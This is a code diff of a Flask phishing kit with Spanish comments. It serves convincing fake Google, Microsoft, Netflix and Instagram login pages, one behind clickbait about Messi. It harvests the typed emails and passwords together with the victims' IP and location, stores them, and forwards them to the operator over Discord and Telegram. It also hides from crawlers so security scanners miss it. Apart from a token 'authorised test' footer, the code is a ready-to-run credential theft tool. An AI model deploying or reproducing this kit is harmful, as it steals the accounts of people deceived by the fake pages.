@@ -1,16 +1,34 @@
 #!/usr/bin/env python3
-from flask import Flask, request, render_template_string, redirect, jsonify
+import os
 import sqlite3
 import json
 import requests
+import hashlib
+import re
 from datetime import datetime
-import os
+from flask import Flask, request, render_template_string, redirect, jsonify, abort
 
 app = Flask(__name__)
 
-# Inicializar DB
+# Config
+CONFIG = {
+    'discord_webhook': None,
+    'telegram_token': None,
+    'telegram_chat': None,
+    'redirect_url': 'https://www.google.com',
+    'template': 'google',
+    'api_key': 'cambia-esta-clave'
+}
+
+def load_config():
+    try:
+        with open('config.json', 'r') as f:
+            CONFIG.update(json.load(f))
+    except:
+        pass
+
 def init_db():
-    conn = sqlite3.connect('credentials.db')
+    conn = sqlite3.connect('credentials.db', check_same_thread=False)
     cursor = conn.cursor()
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS credentials (
@@ -21,57 +39,84 @@ def init_db():
             password TEXT,
             user_agent TEXT,
             referer TEXT,
-            geo_location TEXT
+            geo_location TEXT,
+            hash TEXT UNIQUE,
+            viewed INTEGER DEFAULT 0
         )
     ''')
     conn.commit()
     conn.close()
 
-def get_template():
+def get_client_ip():
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if ',' in str(ip):
+        ip = ip.split(',')[0].strip()
+    return ip
+
+def get_geo(ip):
     try:
-        with open('config.json', 'r') as f:
-            config = json.load(f)
-            template_name = config.get('template', 'google')
+        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city", timeout=3).json()
+        if r.get('status') == 'success':
+            return f"{r.get('city', 'Unknown')}, {r.get('country', 'Unknown')}"
     except:
-        template_name = 'google'
+        pass
+    return "Unknown"
+
+def is_bot(ua):
+    bots = ['bot', 'crawler', 'spider', 'facebook', 'google', 'bing']
+    return any(b in ua.lower() for b in bots)
+
+def send_notifications(data):
+    # Discord
+    if CONFIG.get('discord_webhook'):
+        try:
+            embed = {
+                "title": "🎯 Nueva Captura",
+                "color": 0x00ff00,
+                "fields": [
+                    {"name": "📍 IP", "value": data['ip'], "inline": True},
+                    {"name": "🌍 Ubicación", "value": data['geo'], "inline": True},
+                    {"name": "👤 Usuario", "value": f"```{data['username']}```", "inline": False},
+                    {"name": "🔑 Contraseña", "value": f"```{data['password'][:20]}...```", "inline": False},
+                ],
+                "footer": {"text": f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"}
+            }
+            requests.post(CONFIG['discord_webhook'], json={"embeds": [embed]}, timeout=5)
+        except:
+            pass
     
+    # Telegram
+    if CONFIG.get('telegram_token') and CONFIG.get('telegram_chat'):
+        try:
+            msg = f"🎯 *Nueva Captura*\n\n📍 `{data['ip']}`\n🌍 `{data['geo']}`\n👤 `{data['username']}`\n🔑 `{data['password'][:30]}`"
+            url = f"https://api.telegram.org/bot{CONFIG['telegram_token']}/sendMessage"
+            requests.post(url, json={"chat_id": CONFIG['telegram_chat'], "text": msg, "parse_mode": "Markdown"}, timeout=5)
+        except:
+            pass
+
+def get_template(name='google'):
     templates = {
-        'google': '''
-<!DOCTYPE html>
-<html>
+        'google': '''<!DOCTYPE html>
+<html lang="es">
 <head>
     <meta charset="UTF-8">
-    <link rel="icon" href="data:;base64,iVBORw0KGgo=">
-    
-    <!-- METADATOS PARA TODAS LAS REDES SOCIALES -->
-    <meta property="og:title" content="😲 Fuertes declaraciones de Messi" />
-    <meta property="og:description" content="Me dijeron que ganaría" />
-    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png" />
-    <meta property="og:url" content="https://video-xeen.onrender.com" />
-    <meta property="og:type" content="website" />
-    <meta property="og:site_name" content="Messi Declaraciones" />
-    
-    <!-- METADATOS PARA TWITTER -->
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="😲 Fuertes declaraciones de Messi" />
-    <meta name="twitter:description" content="Me dijeron que ganaría" />
-    <meta name="twitter:image" content="https://i.imgur.com/kgo0gfA.png" />
-    
-    <!-- METADATOS PARA WHATSAPP (usa los mismos de og:) -->
-    
-    <title>😲 Fuertes declaraciones de Messi</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="😲 Fuertes declaraciones de Messi">
+    <meta property="og:description" content="Ver video exclusivo">
+    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
+    <title>Iniciar sesión</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
-        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { background: white; padding: 48px 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 450px; text-align: center; }
-        .logo { width: 75px; margin-bottom: 20px; }
-        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
-        p { color: #5f6368; margin-bottom: 30px; }
-        input { width: 100%; padding: 13px 15px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
-        input:focus { outline: none; border-color: #1a73e8; }
-        button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
-        button:hover { background: #1557b0; }
-        .footer { margin-top: 30px; font-size: 14px; color: #5f6368; }
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Roboto',sans-serif}
+        body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
+        .container{background:white;padding:48px 40px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1);width:100%;max-width:450px;text-align:center}
+        .logo{width:75px;margin-bottom:20px}
+        h1{font-size:24px;font-weight:400;margin-bottom:10px;color:#202124}
+        p{color:#5f6368;margin-bottom:30px}
+        input{width:100%;padding:13px 15px;margin-bottom:15px;border:1px solid #dadce0;border-radius:4px;font-size:16px}
+        input:focus{outline:none;border-color:#1a73e8}
+        button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:16px;cursor:pointer}
+        button:hover{background:#1557b0}
+        .footer{margin-top:30px;font-size:14px;color:#5f6368}
     </style>
 </head>
 <body>
@@ -80,29 +125,30 @@ def get_template():
         <h1>Iniciar sesión</h1>
         <p>Utiliza tu cuenta de Google</p>
         <form action="/capture" method="POST">
-            <input type="email" name="email" placeholder="Correo electrónico" required>
-            <input type="password" name="password" placeholder="Contraseña" required>
+            <input type="email" name="email" placeholder="Correo electrónico" required autocomplete="email">
+            <input type="password" name="password" placeholder="Contraseña" required autocomplete="current-password">
             <button type="submit">Siguiente</button>
         </form>
         <div class="footer">Prueba de seguridad autorizada</div>
     </div>
 </body>
 </html>''',
-        'microsoft': '''
-<!DOCTYPE html>
-<html>
+        
+        'microsoft': '''<!DOCTYPE html>
+<html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Iniciar sesión en tu cuenta</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
-        body { background: linear-gradient(120deg, #f0f0f0 0%, #e0e0e0 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { background: white; padding: 44px; width: 440px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
-        .logo { width: 108px; margin-bottom: 16px; }
-        h1 { font-size: 24px; font-weight: 600; margin-bottom: 12px; color: #1b1b1b; }
-        input { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ccc; font-size: 15px; }
-        button { width: 100%; padding: 12px; background: #0067b8; color: white; border: none; font-size: 15px; cursor: pointer; }
-        button:hover { background: #005a9e; }
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
+        body{background:linear-gradient(120deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
+        .container{background:white;padding:44px;width:100%;max-width:440px;box-shadow:0 4px 20px rgba(0,0,0,0.15)}
+        .logo{width:108px;margin-bottom:16px}
+        h1{font-size:24px;font-weight:600;margin-bottom:12px;color:#1b1b1b}
+        input{width:100%;padding:12px;margin-bottom:12px;border:1px solid #ccc;font-size:15px}
+        button{width:100%;padding:12px;background:#0067b8;color:white;border:none;font-size:15px;cursor:pointer}
+        button:hover{background:#005a9e}
     </style>
 </head>
 <body>
@@ -117,20 +163,21 @@ def get_template():
     </div>
 </body>
 </html>''',
-        'netflix': '''
-<!DOCTYPE html>
-<html>
+        
+        'netflix': '''<!DOCTYPE html>
+<html lang="es">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Netflix</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', sans-serif; }
-        body { background: black; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { background: rgba(0,0,0,0.75); padding: 60px 68px; width: 450px; border-radius: 4px; }
-        h1 { color: white; font-size: 32px; margin-bottom: 28px; font-weight: 700; }
-        input { width: 100%; padding: 16px; margin-bottom: 16px; background: #333; border: none; border-radius: 4px; color: white; font-size: 16px; }
-        button { width: 100%; padding: 16px; background: #e50914; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 700; cursor: pointer; }
-        button:hover { background: #f40612; }
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Helvetica Neue',sans-serif}
+        body{background:#141414;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
+        .container{background:rgba(0,0,0,0.75);padding:60px 68px;width:100%;max-width:450px;border-radius:4px}
+        h1{color:white;font-size:32px;margin-bottom:28px;font-weight:700}
+        input{width:100%;padding:16px;margin-bottom:16px;background:#333;border:none;border-radius:4px;color:white;font-size:16px}
+        button{width:100%;padding:16px;background:#e50914;color:white;border:none;border-radius:4px;font-size:16px;font-weight:700;cursor:pointer;margin-top:8px}
+        button:hover{background:#f40612}
     </style>
 </head>
 <body>
@@ -144,20 +191,21 @@ def get_template():
     </div>
 </body>
 </html>''',
-        'instagram': '''
-<!DOCTYPE html>
-<html>
+        
+        'instagram': '''<!DOCTYPE html>
+<html lang="es">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
-        body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
-        .logo { font-size: 40px; font-family: 'Brush Script MT', cursive; margin-bottom: 30px; }
-        input { width: 100%; padding: 9px; margin-bottom: 6px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 14px; }
-        button { width: 100%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 12px; }
-        button:hover { background: #0081d6; }
+        *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,sans-serif}
+        body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
+        .container{background:white;border:1px solid #dbdbdb;padding:40px;width:100%;max-width:350px;text-align:center}
+        .logo{font-size:40px;font-family:'Brush Script MT',cursive;margin-bottom:30px}
+        input{width:100%;padding:9px;margin-bottom:6px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:14px}
+        button{width:100%;padding:8px;background:#0095f6;color:white;border:none;border-radius:4px;font-weight:600;cursor:pointer;margin-top:12px}
+        button:hover{background:#0081d6}
     </style>
 </head>
 <body>
@@ -172,90 +220,97 @@ def get_template():
 </body>
 </html>'''
     }
-    
-    return templates.get(template_name, templates['google'])
+    return templates.get(name, templates['google'])
 
-def send_webhook(data):
-    try:
-        with open('webhook_config.json', 'r') as f:
-            config = json.load(f)
-    except:
-        return
-    
-    # Discord
-    if config.get('discord_webhook'):
-        try:
-            import requests
-            message = {
-                "content": f"🎯 **Nueva víctima!**\\n📍 IP: {data['ip']}\\n👤 Usuario: {data['username']}\\n🔑 Pass: {data['password'][:10]}...",
-                "username": "ScorpFish Bot"
-            }
-            requests.post(config['discord_webhook'], json=message, timeout=5)
-        except:
-            pass
-    
-    # Telegram
-    if config.get('telegram_token') and config.get('telegram_chat'):
-        try:
-            url = f"https://api.telegram.org/bot{config['telegram_token']}/sendMessage"
-            message = f"🎯 Nueva víctima!\\n📍 IP: {data['ip']}\\n👤 Usuario: {data['username']}"
-            requests.post(url, json={"chat_id": config['telegram_chat'], "text": message}, timeout=5)
-        except:
-            pass
+@app.before_request
+def check_bot():
+    ua = request.headers.get('User-Agent', '')
+    if is_bot(ua) and request.path == '/':
+        abort(403)
 
 @app.route('/')
 def index():
-    # MODO PRUEBA: SIN BLOQUEOS PARA QUE FUNCIONE EN TODAS PARTES
-    return render_template_string(get_template())
+    return render_template_string(get_template(CONFIG.get('template', 'google')))
 
 @app.route('/capture', methods=['POST'])
 def capture():
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    ip = get_client_ip()
+    geo = get_geo(ip)
     
-    try:
-        geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
-        location = f"{geo.get('city', 'Unknown')}, {geo.get('country', 'Unknown')}"
-    except:
-        location = "Unknown"
+    username = request.form.get('email') or request.form.get('username', '')
+    password = request.form.get('password', '')
+    
+    # Evitar duplicados
+    hash_str = hashlib.md5(f"{ip}:{username}:{password}".encode()).hexdigest()
     
     data = {
         'timestamp': datetime.now().isoformat(),
         'ip': ip,
-        'username': request.form.get('email') or request.form.get('username'),
-        'password': request.form.get('password'),
-        'user_agent': request.headers.get('User-Agent'),
-        'referer': request.headers.get('Referer'),
-        'geo_location': location
+        'username': username,
+        'password': password,
+        'user_agent': request.headers.get('User-Agent', ''),
+        'referer': request.headers.get('Referer', ''),
+        'geo': geo,
+        'hash': hash_str
     }
     
-    # Guardar en DB
-    conn = sqlite3.connect('credentials.db')
-    cursor = conn.cursor()
-    cursor.execute('''
-        INSERT INTO credentials (timestamp, ip, username, password, user_agent, referer, geo_location)
-        VALUES (?, ?, ?, ?, ?, ?, ?)
-    ''', (data['timestamp'], data['ip'], data['username'], data['password'], 
-          data['user_agent'], data['referer'], data['geo_location']))
-    conn.commit()
-    conn.close()
+    # Guardar
+    try:
+        conn = sqlite3.connect('credentials.db', check_same_thread=False)
+        cursor = conn.cursor()
+        cursor.execute('''
+            INSERT OR IGNORE INTO credentials (timestamp, ip, username, password, user_agent, referer, geo_location, hash)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+        ''', (data['timestamp'], data['ip'], data['username'], data['password'],
+              data['user_agent'], data['referer'], geo, hash_str))
+        conn.commit()
+        conn.close()
+    except Exception as e:
+        print(f"DB error: {e}")
     
-    # Enviar webhook
-    send_webhook(data)
-    
-    # Redirigir
-    return redirect("https://www.google.com")
+    send_notifications(data)
+    return redirect(CONFIG.get('redirect_url', 'https://www.google.com'))
 
 @app.route('/api/credentials')
 def api_credentials():
-    conn = sqlite3.connect('credentials.db')
+    key = request.headers.get('X-API-Key')
+    if key != CONFIG.get('api_key'):
+        abort(401)
+    
+    conn = sqlite3.connect('credentials.db', check_same_thread=False)
     cursor = conn.cursor()
-    cursor.execute('SELECT * FROM credentials ORDER BY id DESC')
-    data = cursor.fetchall()
+    cursor.execute('SELECT id, timestamp, ip, username, password, geo_location, viewed FROM credentials ORDER BY id DESC')
+    rows = cursor.fetchall()
+    cursor.execute('UPDATE credentials SET viewed = 1 WHERE viewed = 0')
+    conn.commit()
     conn.close()
-    return jsonify(data)
+    
+    return jsonify([{
+        'id': r[0], 'timestamp': r[1], 'ip': r[2], 'username': r[3],
+        'password': r[4], 'location': r[5], 'viewed': r[6]
+    } for r in rows])
+
+@app.route('/api/stats')
+def stats():
+    key = request.headers.get('X-API-Key')
+    if key != CONFIG.get('api_key'):
+        abort(401)
+    
+    conn = sqlite3.connect('credentials.db', check_same_thread=False)
+    cursor = conn.cursor()
+    cursor.execute('SELECT COUNT(*), COUNT(DISTINCT ip), COUNT(CASE WHEN viewed=0 THEN 1 END) FROM credentials')
+    total, unique, new = cursor.fetchone()
+    conn.close()
+    
+    return jsonify({'total': total, 'unique_ips': unique, 'new': new})
+
+@app.route('/health')
+def health():
+    return jsonify({'status': 'ok', 'time': datetime.now().isoformat()})
 
 if __name__ == '__main__':
+    load_config()
     init_db()
-    print("[+] Servidor iniciado en http://localhost:8080")
-    print("[+] Presiona Ctrl+C para detener")
-    app.run(host='0.0.0.0', port=8080, debug=False)
+    port = int(os.environ.get('PORT', 8080))
+    print(f"[+] Server started on port {port}")
+    app.run(host='0.0.0.0', port=port, debug=False)
